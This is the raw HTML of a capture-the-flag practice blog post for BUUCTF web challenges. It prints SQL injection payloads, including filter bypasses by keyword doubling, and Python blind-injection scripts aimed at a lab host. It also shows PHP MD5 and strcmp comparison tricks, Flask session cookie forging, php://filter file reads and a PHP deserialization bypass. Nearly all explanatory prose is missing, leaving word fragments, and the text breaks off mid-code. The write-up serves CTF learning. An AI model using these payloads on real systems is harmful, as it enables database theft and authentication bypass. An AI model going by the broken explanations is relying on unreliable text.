src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823191000126.png\" alt=\"image-20200823191000126\"></p>\n<p><strong>mysql</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#</span><br><span class=\"line\">rename table o_name to n_name;</span><br><span class=\"line\">#</span><br><span class=\"line\">alert table table_name add column_name [type];</span><br><span class=\"line\">#</span><br><span class=\"line\">alert table table_name change o_name n_name [type];</span><br></pre></td></tr></table></figure>\n<h2 id=\"SUCTF-2019-EasySQL\"><a href=\"#SUCTF-2019-EasySQL\" class=\"headerlink\" title=\"[SUCTF 2019]EasySQL\"></a>[SUCTF 2019]EasySQL</h2><p></p>\n<p>Flag</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823214702265.png\" alt=\"image-20200823214702265\"></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 1;set sql_mode&#x3D;pipes_as_concat;</span><br><span class=\"line\">select 1||flag from Flag;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>@@sql_modemysql<br>PIPES_AS_CONCAT||Concat</p>\n</blockquote>\n<p>||or</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215540471.png\" alt=\"image-20200823215540471\"></p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215640962.png\" alt=\"image-20200823215640962\"></p>\n<h2 id=\"-2019-EasySQL\"><a href=\"#-2019-EasySQL\" class=\"headerlink\" title=\"[ 2019]EasySQL\"></a>[ 2019]EasySQL</h2><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#39; or 1&#x3D;1 %23&amp;password&#x3D;1&#39; or 1&#x3D;1%23</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823221210961.png\" alt=\"image-20200823221210961\"></p>\n<h2 id=\"-2019-LoveSQL\"><a href=\"#-2019-LoveSQL\" class=\"headerlink\" title=\"[ 2019]LoveSQL\"></a>[ 2019]LoveSQL</h2><p>sql</p>\n<p>union</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#</span><br><span class=\"line\">1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;geekuser&quot;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;l0ve1ysq1&quot;)#</span><br><span class=\"line\">1&#39; union select 1,(select group_concat(password) from geekuser),(select group_concat(password) from l0ve1ysq1)#</span><br></pre></td></tr></table></figure>\n<h2 id=\"-2019-BabySQL\"><a href=\"#-2019-BabySQL\" class=\"headerlink\" title=\"[ 2019]BabySQL\"></a>[ 2019]BabySQL</h2><p></p>\n<p>select</p>\n<p>selectunionorinformation,passwordfromwhere</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39; ununionion selselectect  1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()),3 #</span><br><span class=\"line\">&#x2F;&#x2F;b4bsql,geekuser</span><br><span class=\"line\">1&#39; ununionion selselectect  1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;geekuser&#39;) #</span><br><span class=\"line\">&#x2F;&#x2F;id username password</span><br><span class=\"line\">&#x2F;&#x2F;id username password</span><br><span class=\"line\">1&#39; ununionion selselectect  1,(selselectect group_concat(username,passwoorrd) frfromom b4bsql),(selselectect group_concat(username,passwoorrd) frfromom geekuser) #</span><br><span class=\"line\">flag&#123;1745650a-3c83-4068-a316-f2604dc9e366&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"CISCN2019--Day2-Web1-Hack-World\"><a href=\"#CISCN2019--Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019  Day2 Web1]Hack World\"></a>[CISCN2019  Day2 Web1]Hack World</h2><p></p>\n<p>unionandorbool</p>\n<p></p>\n<blockquote>\n<p>/**/  %0a `` tab</p>\n</blockquote>\n<p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">dic =<span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\">url = <span class=\"string\">\"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        payload = <span class=\"string\">\"if((mid((select(flag)from(flag)),&#123;0&#125;,1)='&#123;1&#125;'),1,2)\"</span>.format(i,j)</span><br><span class=\"line\">        data = &#123;<span class=\"string\">\"id\"</span>: payload,&#125;</span><br><span class=\"line\">        r = requests.post(url=url,data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Hello\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            flag += j</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag</span><br><span class=\"line\">flag&#123;3ba1b350-3474-44d2-a3cd-52f61aaeca64&#125;</span><br></pre></td></tr></table></figure>\n<p>-payload</p>\n<p>,ascii</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">dic =<span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\">url = <span class=\"string\">\"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">        payload = <span class=\"string\">\"if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)\"</span>.format(i,j);</span><br><span class=\"line\">        data = &#123;<span class=\"string\">\"id\"</span>: payload,&#125;</span><br><span class=\"line\">        r = requests.post(url=url,data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Hello\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            flag += str(chr(j))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br></pre></td></tr></table></figure>\n<p>py</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"-2019-Havefun\"><a href=\"#-2019-Havefun\" class=\"headerlink\" title=\"[ 2019]Havefun\"></a>[ 2019]Havefun</h2><p></p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222031931.png\" alt=\"image-20200823222031931\"></p>\n<p>flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat&#x3D;dog</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222049635.png\" alt=\"image-20200823222049635\"></p>\n<h2 id=\"-2019-BuyFlag\"><a href=\"#-2019-BuyFlag\" class=\"headerlink\" title=\"[ 2019]BuyFlag\"></a>[ 2019]BuyFlag</h2><p></p>\n<p><strong>strcmp()</strong></p>\n<blockquote>\n<p>strcmp()0<br>NULL== NULL==0bool(true)</p>\n</blockquote>\n<p><strong>is_numeric()</strong></p>\n<blockquote>\n<p>is_numeric() 1016<br>is_numeric%00%00%20<br>sql1 or 116sql</p>\n</blockquote>\n<p>cookiepostpasswordmoney</p>\n<p>moneystrcmp()</p>\n<h2 id=\"BJDCTF2020-Easy-MD5ffifdyop\"><a href=\"#BJDCTF2020-Easy-MD5ffifdyop\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5ffifdyop\"></a>[BJDCTF2020]Easy MD5<strong>ffifdyop</strong></h2><p>hint</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">password&#x3D;&#39;&#39; or &#39;123&#39;</span><br></pre></td></tr></table></figure>\n<p><strong>ffifdyop</strong>MD5</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;or&#39;6]!r,b\u001c</span><br></pre></td></tr></table></figure>\n<p></p>\n<p></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class=\"line\">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class=\"line\"></span><br><span class=\"line\">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">QNKCDZO</span><br><span class=\"line\">240610708</span><br><span class=\"line\">s878926199a</span><br><span class=\"line\">s155964671a</span><br><span class=\"line\">s214587387a</span><br><span class=\"line\">s214587387a</span><br></pre></td></tr></table></figure>\n<p>MD50</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200903205415553.png\" alt=\"image-20200903205415553\"></p>\n<h3 id><a href=\"#\" class=\"headerlink\" title=\" \"></a> </h3><h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"-2018-easy-tornado\"><a href=\"#-2018-easy-tornado\" class=\"headerlink\" title=\"[ 2018]easy_tornado\"></a>[ 2018]easy_tornado</h2><p>tornado</p>\n<p><a href=\"https://blog.csdn.net/belalds/article/details/80575755\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/belalds/article/details/80575755</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> tornado.web</span><br><span class=\"line\"><span class=\"keyword\">import</span> tornado.ioloop</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexHandler</span><span class=\"params\">(tornado.web.RequestHandler)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"\"\"\"</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"httpget\"\"\"</span></span><br><span class=\"line\">        self.write(<span class=\"string\">\"Hello Itcast!\"</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app = tornado.web.Application([</span><br><span class=\"line\">        (<span class=\"string\">r\"/\"</span>, IndexHandler),</span><br><span class=\"line\">    ])</span><br><span class=\"line\">    app.listen(<span class=\"number\">8000</span>)</span><br><span class=\"line\">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>\n<ol>\n<li>tornado.web</li>\n</ol>\n<p>tornadoweb</p>\n<ul>\n<li><strong>RequestHandler</strong></li>\n</ul>\n<p>write()httpgetpostgetget()<strong>405: Method Not Allowed</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> tornado.web</span><br><span class=\"line\"><span class=\"keyword\">import</span> tornado.ioloop</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexHandler</span><span class=\"params\">(tornado.web.RequestHandler)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"\"\"\"</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span><span class=\"params\">(self)</span>:</span>  <span class=\"comment\"># </span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"httppost\"\"\"</span></span><br><span class=\"line\">        self.write(<span class=\"string\">\"Hello Itcast!\"</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app = tornado.web.Application([</span><br><span class=\"line\">        (<span class=\"string\">r\"/\"</span>, IndexHandler),</span><br><span class=\"line\">    ])</span><br><span class=\"line\">    app.listen(<span class=\"number\">8000</span>)</span><br><span class=\"line\">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>Application</strong></li>\n</ul>\n<p>Tornado Weblisten()http<strong></strong></p>\n<p><strong>Tornado Web</strong></p>\n<ol>\n<li>web</li>\n<li>handler</li>\n<li></li>\n<li>IOLoop</li>\n</ol>\n<h2 id=\"HCTF-2018-adminflasksession\"><a href=\"#HCTF-2018-adminflasksession\" class=\"headerlink\" title=\"[HCTF 2018]adminflasksession\"></a>[HCTF 2018]adminflasksession</h2><p>adminflag</p>\n<p>flasksession</p>\n<p><strong>sessionflasksessionflask</strong></p>\n<p></p>\n<p>testcookiepgithubflask-session-managerdone</p>\n<p>python2.7</p>\n<p>:<code>python flask_session_manager2.py decode -c -s # -cflask cookiesession -sSECRET_KEY</code><br> :<code>python flask_session_manager2.py encode -s -t # -sSECRET_KEY -tsessionsession</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.eJw9kEGPgjAQhf_KZs4eBJcLiZdNkUjSIZBKM70Y10VKS90EMCjG_77VTbxN8mbe-97cYX_q60FDPPaXegH79gfiO3x8Qwzc8WUuN45kaXLRGWSVphC1Mk2Uy6ojWYRosg7DTYuzNmi0Ib_HjXY8pJWS6Ge6cZlc8zQJlKlabjLHWWn5vHFcFCtMdzeabcRd5hTbTWjsFV0RkdtFitlJCZ_FmiuZUpOgT5KVU6IIFPM8YRKQ0JYLWsNjAcehP-3HX1uf3xWQFQGm2-l5ygW2Sm5DlVYdTynC2WN4TBJf3RORRGbRHG-qWb_sWndo6rdTmWSzmP6V88F5AcZ6GGEBl6HuX2-DYAmPP9bObbw.X1R2Pw.c_FhTL4z1ufpRuGX5k2__AoFhBU</span><br><span class=\"line\">&#123;u&#39;csrf_token&#39;: &#39;4454b0a6813beb6dee0f974d3f7a0e1a1a2d672f&#39;, u&#39;user_id&#39;: u&#39;10&#39;, u&#39;name&#39;: u&#39;test&#39;, u&#39;image&#39;: &#39;DBsO&#39;, u&#39;_fresh&#39;: True, u&#39;_id&#39;: &#39;2c49afadc99c45accaf899eead662e7ab78c68ca9c28f3f7ecc2621a18a5f5b22f04d31f1474e2c992bfd506916d9be9d90e89881b4aa68aefe45d9c7a5a8d16&#39;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.eJw9kE-LwjAQxb_KMmcPtm4vgpcltVjIlJbYMLmIf2rTpHGhVVorfveNLngbeDPv_d48YHfuql7D8trdqhnsmhMsH_B1gCVwx-eZXDuShclEa5CVmkLUytRRJsuWZB6iSVsM1w1O2qDRhvweN9rxkBZKop_pzmU8ZkkcKFM23KSOs8Lyae24yBeYbO802Yi71Cm2HdDYEV0ekdtGitlBCZ_F6pFMoUnQN8nSKZEHinmeMA5IaMsFreA5g2PfnXfXX1tdPhWQ5QEmm-F1ygU2Sm5ClZQtTyjCyWN4TBI_7QuRRGrRHO-qXr3tGrevq49TEaeTGP6Vy955AfYn11xgBre-6t5_g2AOzz9EfG4F.X1R5Og.sdx02y47Ad8Rck93GVBwZ0RVTOs</span><br></pre></td></tr></table></figure>\n<p></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"-2019-Secret\"><a href=\"#-2019-Secret\" class=\"headerlink\" title=\"[ 2019]Secret\"></a>[ 2019]Secret</h2><p>flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class=\"line\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>\n<h2 id=\"ACTF2020--Include\"><a href=\"#ACTF2020--Include\" class=\"headerlink\" title=\"[ACTF2020 ]Include\"></a>[ACTF2020 ]Include</h2><p>flag.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h1><h2 id=\"-2019-PHP\"><a href=\"#-2019-PHP\" class=\"headerlink\" title=\"[ 2019]PHP\"></a>[ 2019]PHP</h2><p>phpwww.zipclass.phpindex.phpflag.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &#39;flag.php&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Name&#123;</span><br><span class=\"line\">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class=\"line\">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($username,$password)&#123;</span><br><span class=\"line\">        $this-&gt;username &#x3D; $username;</span><br><span class=\"line\">        $this-&gt;password &#x3D; $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class=\"line\">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;You name is: &quot;;</span><br><span class=\"line\">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;You password is: &quot;;</span><br><span class=\"line\">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class=\"line\">            global $flag;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>100username=admin</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $username = <span class=\"string\">\"admin\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $password = <span class=\"string\">\"100\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> Name();</span><br><span class=\"line\">$a = serialize($a); </span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode($a);</span><br><span class=\"line\"><span class=\"comment\">//O:4:\"Name\":3:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";s:3:\"100\";&#125;</span></span><br></pre></td></tr></table></figure>\n<p>url</p>\n<h2 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$text = $_GET[<span class=\"string\">\"text\"</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the zjctf\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;h1&gt;\"</span>.file_get_contents($text,<span class=\"string\">'r'</span>).<span class=\"string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span>;  <span class=\"comment\">//textwelcome to the zjctf</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Not now!\"</span>;  <span class=\"comment\">//fileflag</span></span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span 